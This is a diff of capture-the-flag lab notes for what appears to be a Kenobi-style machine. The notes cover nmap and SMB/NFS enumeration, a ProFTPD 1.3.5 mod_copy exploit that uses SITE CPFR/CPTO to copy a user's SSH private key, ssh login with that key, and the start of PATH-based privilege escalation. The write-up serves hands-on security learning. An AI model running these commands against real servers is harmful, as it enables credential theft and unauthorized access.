@@ -1,5 +1,5 @@
 export IP=10.10.206.181
-----------------------------------
+
 
 nmap scan: nmap -sC -sV -oN nmap/initial $IP    
 
@@ -49,7 +49,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.14 seconds
----------------------------------------------------------
+
 
 scaning for shares with samba: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
 
@@ -89,10 +89,10 @@ Host script results:
 |_    Current user access: <none>
 
 Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
------------------------------------------------------------
+
 
 inspecting shares: smbclient //<ip>/anonymous
--------------------------------------------------------------
+
 
 downloading SMB share: smbget -R smb://<ip>/anonymous
 
@@ -100,7 +100,7 @@ result: Password for [root] connecting to //anonymous/10.10.206.181:
 Using workgroup WORKGROUP, user root
 smb://10.10.206.181/anonymous/log.txt                                                                      
 Downloaded 11.95kB in 6 seconds
------------------------------------------------------------
+
 
 cat log.txt
 
@@ -455,7 +455,7 @@ AllowOverwrite          on
    browseable = yes
    read only = yes
    guest ok = yes
-----------------------------------------------------
+
 
 In our case, port 111 is access to a network file system. Lets use nmap to enumerate this: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.206.181
 
@@ -486,20 +486,21 @@ PORT    STATE SERVICE
 |_  /var        9204224.0  1836540.0  6877088.0  22%   16.0T        32000
 
 Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
--------------------------------------------------------------
+
 
 ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.
 
 Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. :nc $IP 21
 
 result: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.206.181]
--------------------------------------------------------------
+
 
 We can use searchsploit to find exploits for a particular software version.
 
 Searchsploit is basically just a command line search tool for exploit-db.com. > searchsploit proftpd 1.3.5
 
-result: ------------------------------------------------------------------------- ---------------------------------
+result: 
+------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                           |  Path
 ------------------------------------------------------------------------- ---------------------------------
 ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                | linux/remote/37262.rb
@@ -515,20 +516,18 @@ The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be us
 
 searchsploit /.../....../
 
-result: scan
-------------------------------------------------------------
 
 moving files from directory somwhere else where we can access it with nc command :
 nc $IP 21
 SITE CPFR /home/kenobi/.ssh/id_rsa
 SITE CPTO /var/tmp/id_rsa
-------------------------------------------------------------
+
 
 making file readable just for us :
 chmod 600 <file name>
 connecting as a user:
 ssh -i <file name> kenobi@$IP
------------------------------------------------------------
+
 
 Privilege Escalation with Path Variable Manipulation
 
@@ -669,4 +668,4 @@ setuid@@GLIBC_2.2.5
 .bss
 .comment
 
-------------------------------------------------------------
+
